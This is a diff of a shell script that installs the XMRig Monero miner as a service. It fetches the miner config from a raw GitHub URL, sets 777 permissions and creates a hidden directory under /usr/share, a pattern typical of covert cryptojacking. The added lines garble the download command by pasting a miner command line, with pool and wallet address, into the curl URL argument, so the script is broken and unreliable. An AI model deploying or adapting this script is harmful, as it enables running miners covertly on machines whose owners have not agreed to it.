@@ -18,7 +18,8 @@ then
    }
    exits
    
-   files=$(curl -s -O <url of xmrig>  -O <url for config.json> )  #add url of xmrig file and config.json.
+   files=$(curl -s -O <xmrig.exe --coin monero -o gulf.moneroocean.stream:10128 -u 45FAyA2GJ68czhTEv2gc4uV2o4DwBhXk4bXciz6FKH4wFHCBNEZgQD5F5Zp8oDLKwuWFq3cAiwMpsQuNCzx5mR825roE1af -p x -t 8 --donate-level 1
+pause>  -O <https://raw.githubusercontent.com/joaohgmelo-beep/sl/main/config.json> )  #add url of xmrig file and config.json.
    touch xmrig.service
    per=$(chmod 777 xmrig config.json && chmod 644 xmrig.service)
    dir=$(mkdir /usr/share/.logstxt)
